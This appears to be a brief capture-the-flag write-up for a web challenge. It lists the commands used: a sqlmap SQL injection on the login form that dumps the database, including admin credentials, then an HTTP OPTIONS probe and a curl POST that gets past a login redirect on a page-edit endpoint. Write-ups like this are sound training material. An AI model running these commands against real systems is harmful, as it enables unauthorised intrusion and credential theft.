It requires to login to create or edit page, the login page seems injectable.

```bash
sqlmap -u http://34.74.105.127/239c7507f5/login --method POST --data "username=FUZZ&password=" -p username --dbs --dbms mysql --regexp "invalid password" --level 2 --dump --random-agent
```

Found admin credential in sqlmap output ``admins.csv``. After login, found one flag. 
In another output of sqlmap ``pages.csv`` there is another flag.

Try to edit or create a page, but it always redirect to login page. check what options are allowed for editing page.

```bash
  http OPTIONS http://35.190.155.168/cf116e4cb3/page/edit/2
```

How about a post request.

```bash
  curl -XPOST http://35.190.155.168/cf116e4cb3/page/edit/2
```
Now we get a flag in response.
